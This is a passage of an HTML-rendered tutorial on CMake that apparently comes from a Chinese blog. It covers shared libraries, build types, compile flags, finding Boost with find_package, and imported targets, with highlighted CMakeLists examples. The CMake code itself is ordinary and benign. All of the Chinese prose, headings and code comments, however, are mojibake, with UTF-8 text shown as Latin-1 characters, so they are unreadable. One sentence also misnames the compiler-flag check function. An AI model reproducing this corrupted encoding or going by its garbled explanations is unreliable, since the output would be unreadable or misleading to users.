variable\">PROJECT_SOURCE_DIR</span><span class=\"token punctuation\">&#125;</span>/include</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># Create an executable</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">############################################################</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">#æ ¹æ® main.cpp ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>hello_binary</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    src/main.cpp</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">#é“¾æ¥åº“å’Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨çš„æ˜¯è¿™ä¸ªåº“çš„åˆ«åã€‚PRIVATE è¡¨ç¤º</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> hello_binary</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token inserted class-name\">hello::library</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"åˆ›å»ºåŠ¨æ€åº“\"><a class=\"markdownIt-Anchor\" href=\"#åˆ›å»ºåŠ¨æ€åº“\">#</a> åˆ›å»ºåŠ¨æ€åº“</h3>\n<p>add_libraryï¼ˆï¼‰å‡½æ•°ç”¨äºä»æŸäº›æºæ–‡ä»¶åˆ›å»ºä¸€ä¸ªåŠ¨æ€åº“ï¼Œé»˜è®¤ç”Ÿæˆåœ¨æ„å»ºæ–‡ä»¶å¤¹ã€‚ å†™æ³•å¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">add_library</span><span class=\"token punctuation\">(</span>hello_library <span class=\"token namespace\">SHARED</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    src/Hello.cpp</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>åœ¨ add_library è°ƒç”¨ä¸­åŒ…å«äº†æºæ–‡ä»¶ï¼Œç”¨äºåˆ›å»ºåç§°ä¸º libhello_library.so çš„åŠ¨æ€åº“ã€‚</p>\n<h2 id=\"äº”build-type\"><a class=\"markdownIt-Anchor\" href=\"#äº”build-type\">#</a> ï¼ˆäº”ï¼‰build-type</h2>\n<h3 id=\"cmakeliststxt-5\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-5\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#å¦‚æœæ²¡æœ‰æŒ‡å®šåˆ™è®¾ç½®é»˜è®¤ç¼–è¯‘æ–¹å¼</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">NOT</span> <span class=\"token variable\">CMAKE_BUILD_TYPE</span> <span class=\"token operator\">AND</span> <span class=\"token operator\">NOT</span> <span class=\"token variable\">CMAKE_CONFIGURATION_TYPES</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token comment\">#åœ¨å‘½ä»¤è¡Œä¸­è¾“å‡º message é‡Œçš„ä¿¡æ¯</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">message</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Setting build type to 'RelWithDebInfo' as none was specified.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">#ä¸ç®¡ CACHE é‡Œæœ‰æ²¡æœ‰è®¾ç½®è¿‡ CMAKE_BUILD_TYPE è¿™ä¸ªå˜é‡ï¼Œéƒ½å¼ºåˆ¶èµ‹å€¼è¿™ä¸ªå€¼ä¸º RelWithDebInfo</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_BUILD_TYPE</span> RelWithDebInfo <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"Choose the type of build.\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\"># å½“ä½¿ç”¨ cmake-gui çš„æ—¶å€™ï¼Œè®¾ç½®æ„å»ºçº§åˆ«çš„å››ä¸ªå¯é€‰é¡¹</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">set_property</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CACHE</span> <span class=\"token variable\">CMAKE_BUILD_TYPE</span> PROPERTY <span class=\"token property\">STRINGS</span> <span class=\"token string\">\"Debug\"</span> <span class=\"token string\">\"Release\"</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"MinSizeRel\"</span> <span class=\"token string\">\"RelWithDebInfo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">endif</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>build_type<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>cmake_examples_build_type main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#è¿™é‡Œçš„æ³¨é‡Šåªè¯´æ˜æ³¨é‡Šåæ¯ä¸€å¥çš„ä½œç”¨</span></pre></td></tr></table></figure><h3 id=\"æ„å»ºçº§åˆ«\"><a class=\"markdownIt-Anchor\" href=\"#æ„å»ºçº§åˆ«\">#</a> æ„å»ºçº§åˆ«</h3>\n<p>CMake å…·æœ‰è®¸å¤šå†…ç½®çš„æ„å»ºé…ç½®ï¼Œå¯ç”¨äºç¼–è¯‘å·¥ç¨‹ã€‚ è¿™äº›é…ç½®æŒ‡å®šäº†ä»£ç ä¼˜åŒ–çš„çº§åˆ«ï¼Œä»¥åŠè°ƒè¯•ä¿¡æ¯æ˜¯å¦åŒ…å«åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚</p>\n<p>è¿™äº›ä¼˜åŒ–çº§åˆ«ï¼Œä¸»è¦æœ‰ï¼š</p>\n<ul>\n<li>\n<p>Release â€”â€” ä¸å¯ä»¥æ‰“æ–­ç‚¹è°ƒè¯•ï¼Œç¨‹åºå¼€å‘å®Œæˆåå‘è¡Œä½¿ç”¨çš„ç‰ˆæœ¬ï¼Œå çš„ä½“ç§¯å°ã€‚ å®ƒå¯¹ä»£ç åšäº†ä¼˜åŒ–ï¼Œå› æ­¤é€Ÿåº¦ä¼šéå¸¸å¿«ï¼Œ</p>\n<p>åœ¨ç¼–è¯‘å™¨ä¸­ä½¿ç”¨å‘½ä»¤ï¼š  <code>-O3 -DNDEBUG</code>  å¯é€‰æ‹©æ­¤ç‰ˆæœ¬ã€‚</p>\n</li>\n<li>\n<p>Debug â€”â€” è°ƒè¯•çš„ç‰ˆæœ¬ï¼Œä½“ç§¯å¤§ã€‚</p>\n<p>åœ¨ç¼–è¯‘å™¨ä¸­ä½¿ç”¨å‘½ä»¤ï¼š  <code>-g</code>  å¯é€‰æ‹©æ­¤ç‰ˆæœ¬ã€‚</p>\n</li>\n<li>\n<p>MinSizeRelâ€”â€” æœ€å°ä½“ç§¯ç‰ˆæœ¬</p>\n<p>åœ¨ç¼–è¯‘å™¨ä¸­ä½¿ç”¨å‘½ä»¤ï¼š <code>-Os -DNDEBUG</code>  å¯é€‰æ‹©æ­¤ç‰ˆæœ¬ã€‚</p>\n</li>\n<li>\n<p>RelWithDebInfoâ€”â€” æ—¢ä¼˜åŒ–åˆèƒ½è°ƒè¯•ã€‚</p>\n<p>åœ¨ç¼–è¯‘å™¨ä¸­ä½¿ç”¨å‘½ä»¤ï¼š <code>-O2 -g -DNDEBUG</code>  å¯é€‰æ‹©æ­¤ç‰ˆæœ¬ã€‚</p>\n</li>\n</ul>\n<h3 id=\"è®¾ç½®çº§åˆ«çš„æ–¹å¼\"><a class=\"markdownIt-Anchor\" href=\"#è®¾ç½®çº§åˆ«çš„æ–¹å¼\">#</a> è®¾ç½®çº§åˆ«çš„æ–¹å¼</h3>\n<h4 id=\"cmakeå›¾å½¢ç•Œé¢\"><a class=\"markdownIt-Anchor\" href=\"#cmakeå›¾å½¢ç•Œé¢\">#</a> CMake å›¾å½¢ç•Œé¢</h4>\n<p>cmake-gui</p>\n<h4 id=\"cmakeå‘½ä»¤è¡Œä¸­\"><a class=\"markdownIt-Anchor\" href=\"#cmakeå‘½ä»¤è¡Œä¸­\">#</a> CMake å‘½ä»¤è¡Œä¸­</h4>\n<p>åœ¨å‘½ä»¤è¡Œè¿è¡Œ CMake çš„æ—¶å€™ï¼Œ ä½¿ç”¨ cmake å‘½ä»¤è¡Œçš„ - D é€‰é¡¹é…ç½®ç¼–è¯‘ç±»å‹</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>cmake .. -DCMAKE_BUILD_TYPE=Release</pre></td></tr></table></figure><h2 id=\"å…­-compile-flags\"><a class=\"markdownIt-Anchor\" href=\"#å…­-compile-flags\">#</a> ï¼ˆå…­ï¼‰ Compile Flags</h2>\n<h3 id=\"cmakeliststxt-6\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-6\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#å¼ºåˆ¶è®¾ç½®é»˜è®¤ C++ ç¼–è¯‘æ ‡å¿—å˜é‡ä¸ºç¼“å­˜å˜é‡ï¼Œå¦‚ CMakeï¼ˆäº”ï¼‰ build type æ‰€è¯´ï¼Œè¯¥ç¼“å­˜å˜é‡è¢«å®šä¹‰åœ¨æ–‡ä»¶ä¸­ï¼Œç›¸å½“äºå…¨å±€å˜é‡ï¼Œæºæ–‡ä»¶ä¸­ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªå˜é‡</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"Set C++ Compiler Flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>compile_flags<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>cmake_examples_compile_flags main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æ·»åŠ ç§æœ‰ç¼–è¯‘å®šä¹‰</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">target_compile_definitions</span><span class=\"token punctuation\">(</span>cmake_examples_compile_flags </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span> EX3</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ç¼–è¯‘æ ‡å¿—\"><a class=\"markdownIt-Anchor\" href=\"#ç¼–è¯‘æ ‡å¿—\">#</a> ç¼–è¯‘æ ‡å¿—</h3>\n<p>ç¼–è¯‘æ ‡å¿—æ˜¯ç¼–è¯‘å™¨åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ä½¿ç”¨çš„ä¸€äº›å‚æ•°ï¼Œç”¨äºæŒ‡å®šç¼–è¯‘å™¨çš„è¡Œä¸ºã€‚ä¸åŒçš„ç¼–è¯‘æ ‡å¿—ä¼šå½±å“ç¼–è¯‘å™¨çš„è¡Œä¸ºï¼Œä»è€Œå½±å“ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è¡Œä¸ºã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸åŒçš„ç¼–è¯‘æ ‡å¿—å¯ä»¥æ§åˆ¶ç¼–è¯‘å™¨çš„ä¼˜åŒ–çº§åˆ«ã€è­¦å‘Šçº§åˆ«ã€è°ƒè¯•ä¿¡æ¯ç­‰ã€‚<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI3ODI1NDUxL2FydGljbGUvZGV0YWlscy8xMDMzOTI3MTk=\">1</span></p>\n<p>åœ¨ CMake ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è®¾ç½®ç¼–è¯‘æ ‡å¿—ï¼š</p>\n<ul>\n<li>é€šè¿‡ target_compile_definitions () å‡½æ•°è®¾ç½®æŸä¸ªç›®æ ‡çš„ç¼–è¯‘æ ‡å¿—ï¼Œè¿™æ˜¯ç°ä»£ CMake ä¸­è®¾ç½® C++ æ ‡å¿—çš„æ¨èæ–¹æ³•ã€‚</li>\n<li>è®¾ç½®é»˜è®¤ç¼–è¯‘æ ‡å¿—ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</li>\n</ul>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_CXX_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"set c++ compiler flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li>è®¾ç½®å…¨å±€ C ç¼–è¯‘å™¨æ ‡å¿—ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDkyMTI2NTA=\">å‚è€ƒ</span></li>\n</ul>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">CMAKE_C_FLAGS</span> <span class=\"token string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">$&#123;</span><span class=\"token variable\">CMAKE_C_FLAGS</span><span class=\"token punctuation\">&#125;</span></span> -DEX2\"</span> <span class=\"token variable\">CACHE</span> STRING <span class=\"token string\">\"set c compiler flags\"</span> FORCE<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ä¸åŒçš„ç¼–è¯‘æ ‡å¿—ä¼šå½±å“ç¼–è¯‘å™¨çš„è¡Œä¸ºï¼Œä»è€Œå½±å“ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è¡Œä¸ºã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸åŒçš„ç¼–è¯‘æ ‡å¿—å¯ä»¥æ§åˆ¶ç¼–è¯‘å™¨çš„ä¼˜åŒ–çº§åˆ«ã€è­¦å‘Šçº§åˆ«ã€è°ƒè¯•ä¿¡æ¯ç­‰ã€‚</p>\n<h2 id=\"ä¸ƒ-including-third-party\"><a class=\"markdownIt-Anchor\" href=\"#ä¸ƒ-including-third-party\">#</a> ï¼ˆä¸ƒï¼‰ Including Third Party</h2>\n<h3 id=\"cmakeliststxt-7\"><a class=\"markdownIt-Anchor\" href=\"#cmakeliststxt-7\">#</a> CMakeLists.txt</h3>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">cmake_minimum_required</span><span class=\"token punctuation\">(</span><span class=\"token property\">VERSION</span> <span class=\"token number\">3.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Set the project name</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">project</span> <span class=\"token punctuation\">(</span>third_party_include<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># find a boost install with the libraries filesystem and system</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#ä½¿ç”¨åº“æ–‡ä»¶ç³»ç»Ÿå’Œç³»ç»ŸæŸ¥æ‰¾ boost install</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">find_package</span><span class=\"token punctuation\">(</span>Boost <span class=\"token number\">1.46.1</span> REQUIRED COMPONENTS filesystem system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#è¿™æ˜¯ç¬¬ä¸‰æ–¹åº“ï¼Œè€Œä¸æ˜¯è‡ªå·±ç”Ÿæˆçš„é™æ€åŠ¨æ€åº“</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># check if boost was found</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>Boost_FOUND<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">message</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"boost found\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">message</span> <span class=\"token punctuation\">(</span>FATAL_ERROR <span class=\"token string\">\"Cannot find Boost\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">endif</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># Add an executable</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">add_executable</span><span class=\"token punctuation\">(</span>third_party_include main.cpp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># link against the boost libraries</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> third_party_include</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token inserted class-name\">Boost::filesystem</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"cmakeè§£æ\"><a class=\"markdownIt-Anchor\" href=\"#cmakeè§£æ\">#</a> CMake è§£æ</h3>\n<p>å‡ ä¹æ‰€æœ‰ä¸å¹³å‡¡çš„é¡¹ç›®éƒ½å°†è¦æ±‚åŒ…å«ç¬¬ä¸‰æ–¹åº“ï¼Œå¤´æ–‡ä»¶æˆ–ç¨‹åºã€‚ CMake æ”¯æŒä½¿ç”¨ find_packageï¼ˆï¼‰å‡½æ•°æŸ¥æ‰¾è¿™äº›å·¥å…·çš„è·¯å¾„ã€‚  è¿™å°†ä» CMAKE_MODULE_PATH ä¸­çš„æ–‡ä»¶å¤¹åˆ—è¡¨ä¸­æœç´¢æ ¼å¼ä¸º â€œFindXXX.cmakeâ€ çš„ CMake æ¨¡å—ã€‚  åœ¨ linux ä¸Šï¼Œé»˜è®¤æœç´¢è·¯å¾„å°†æ˜¯ /usr/share /cmake/ Modulesã€‚  åœ¨æˆ‘çš„ç³»ç»Ÿä¸Šï¼Œè¿™åŒ…æ‹¬å¯¹å¤§çº¦ 142 ä¸ªé€šç”¨ç¬¬ä¸‰æ–¹åº“çš„æ”¯æŒã€‚</p>\n<p>æ­¤ç¤ºä¾‹è¦æ±‚å°† Boost åº“å®‰è£…åœ¨é»˜è®¤ç³»ç»Ÿä½ç½®ã€‚</p>\n<h3 id=\"finding-a-package\"><a class=\"markdownIt-Anchor\" href=\"#finding-a-package\">#</a> Finding a Package</h3>\n<p>å¦‚ä¸Šæ‰€è¿°ï¼Œfind_packageï¼ˆï¼‰å‡½æ•°å°†ä» CMAKE_MODULE_PATH ä¸­çš„æ–‡ä»¶å¤¹åˆ—è¡¨ä¸­æœç´¢ â€œFindXXX.cmakeâ€ ä¸­çš„ CMake æ¨¡å—ã€‚ find_package å‚æ•°çš„ç¡®åˆ‡æ ¼å¼å–å†³äºè¦æŸ¥æ‰¾çš„æ¨¡å—ã€‚  è¿™é€šå¸¸è®°å½•åœ¨ FindXXX.cmake æ–‡ä»¶çš„é¡¶éƒ¨ã€‚</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">find_package</span><span class=\"token punctuation\">(</span>Boost <span class=\"token number\">1.46.1</span> REQUIRED COMPONENTS filesystem system<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>å‚æ•°ï¼š</p>\n<p>Boost - åº“åç§°ã€‚ è¿™æ˜¯ç”¨äºæŸ¥æ‰¾æ¨¡å—æ–‡ä»¶ FindBoost.cmake çš„ä¸€éƒ¨åˆ†</p>\n<p>1.46.1 - éœ€è¦çš„ boost åº“æœ€ä½ç‰ˆæœ¬</p>\n<p>REQUIRED - å‘Šè¯‰æ¨¡å—è¿™æ˜¯å¿…éœ€çš„ï¼Œå¦‚æœæ‰¾ä¸åˆ°ä¼šæŠ¥é”™</p>\n<p>COMPONENTS - è¦æŸ¥æ‰¾çš„åº“åˆ—è¡¨ã€‚ä»åé¢çš„å‚æ•°ä»£è¡¨çš„åº“é‡Œæ‰¾ boost</p>\n<p>å¯ä»¥ä½¿ç”¨æ›´å¤šå‚æ•°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–å˜é‡ã€‚ åœ¨åé¢çš„ç¤ºä¾‹ä¸­æä¾›äº†æ›´å¤æ‚çš„è®¾ç½®ã€‚</p>\n<h2 id=\"18-ç”¨clangç¼–è¯‘å·¥ç¨‹æˆ‘ç•¥äº†\"><a class=\"markdownIt-Anchor\" href=\"#18-ç”¨clangç¼–è¯‘å·¥ç¨‹æˆ‘ç•¥äº†\">#</a> 1.8 ç”¨ clang ç¼–è¯‘å·¥ç¨‹ (æˆ‘ç•¥äº†)</h2>\n<p>ä½¿ç”¨ CMake è¿›è¡Œæ„å»ºæ—¶ï¼Œå¯ä»¥è®¾ç½® C å’Œ C ++ ç¼–è¯‘å™¨ã€‚ æ­¤ç¤ºä¾‹ä¸<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZnVtZWNqZi5naXRodWIuaW8vY21ha2UtZXhhbXBsZXMtQ2hpbmVzZS9BLWhlbGxvLWNtYWtl\"> hello-cmake</span> ç¤ºä¾‹ç›¸åŒï¼Œä¸åŒä¹‹å¤„åœ¨äºå®ƒæ˜¾ç¤ºäº†å°†ç¼–è¯‘å™¨ä»é»˜è®¤çš„ gcc æ›´æ”¹ä¸º<span class=\"exturl\" data-url=\"aHR0cDovL2NsYW5nLmxsdm0ub3JnLw==\"> clang</span> çš„æœ€åŸºæœ¬æ–¹æ³•ã€‚</p>\n<h2 id=\"19-ç”¨ninjaæ„å»ºå·¥ç¨‹ç•¥å•¦\"><a class=\"markdownIt-Anchor\" href=\"#19-ç”¨ninjaæ„å»ºå·¥ç¨‹ç•¥å•¦\">#</a> 1.9 ç”¨ ninja æ„å»ºå·¥ç¨‹ (ç•¥å•¦)</h2>\n<p>CMake æ˜¯ä¸€ä¸ªå…ƒæ„å»ºç³»ç»Ÿï¼Œå¯ç”¨äºä¸ºè®¸å¤šå…¶ä»–æ„å»ºå·¥å…·åˆ›å»ºæ„å»ºæ–‡ä»¶ã€‚ è¿™ä¸ªä¾‹å­å±•ç¤ºäº†å¦‚ä½•è®© CMake ä½¿ç”¨ ninja æ„å»ºå·¥å…·ã€‚</p>\n<h2 id=\"110-å¯¼å…¥ç¬¬ä¸‰æ–¹åº“åˆ°ç›®æ ‡\"><a class=\"markdownIt-Anchor\" href=\"#110-å¯¼å…¥ç¬¬ä¸‰æ–¹åº“åˆ°ç›®æ ‡\">#</a> 1.10 å¯¼å…¥ç¬¬ä¸‰æ–¹åº“åˆ°ç›®æ ‡</h2>\n<h3 id=\"å¯¼å…¥ç›®æ ‡\"><a class=\"markdownIt-Anchor\" href=\"#å¯¼å…¥ç›®æ ‡\">#</a> å¯¼å…¥ç›®æ ‡</h3>\n<p>Imported targets æ˜¯ FindXXX æ¨¡å—å¯¼å‡ºçš„åªè¯»ç›®æ ‡ã€‚</p>\n<p>åœ¨ CMake å‘½ä»¤ä¸­åŒ…å« boost è¿™ä¸ªåº“ï¼š</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">target_link_libraries</span><span class=\"token punctuation\">(</span> imported_targets</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token namespace\">PRIVATE</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>          <span class=\"token inserted class-name\">Boost::filesystem</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><ul>\n<li>\n<p>ä½œç”¨æ˜¯è‡ªåŠ¨é“¾æ¥ Boost</p>\n<p>filesystem å’Œ Boost :: system åº“ï¼ŒåŒæ—¶è¿˜åŒ…æ‹¬ Boost å¤´æ–‡ä»¶ç›®å½•ã€‚</p>\n</li>\n</ul>\n<h2 id=\"111-è®¾ç½®c-æ ‡å‡†\"><a class=\"markdownIt-Anchor\" href=\"#111-è®¾ç½®c-æ ‡å‡†\">#</a> 1.11 è®¾ç½® C++ æ ‡å‡†</h2>\n<p>CMake æ”¯æŒä¼ é€’ä¸€ä¸ªå˜é‡ç»™å‡½æ•° CMAKE_CXX_COMPILER_FLAG æ¥ç¼–è¯‘ç¨‹åºã€‚ ç„¶åå°†ç»“æœå­˜å‚¨åœ¨æ‚¨ä¼ é€’çš„å˜é‡ä¸­ã€‚</p>\n<p>For example:</p>\n<figure class=\"highlight cmake\"><figcaption data-lang=\"CMake\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span>CheckCXXCompilerFlag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">CHECK_CXX_COMPILER_FLAG</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-std=c++11\"</span> COMPILER_SUPPORTS_CXX11<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"21å­é¡¹ç›®\"><a class=\"markdownIt-Anchor\" href=\"#21å­é¡¹ç›®\">#</a> 2.1 å­é¡¹ç›®</h2>\n<p>æœ¬ç¤ºä¾‹è¯´æ˜å¦‚ä½•åŒ…å«å­é¡¹ç›®ã€‚ é¡¶çº§ CMakeLists.txt è°ƒç”¨å­ç›®å½•ä¸­çš„ 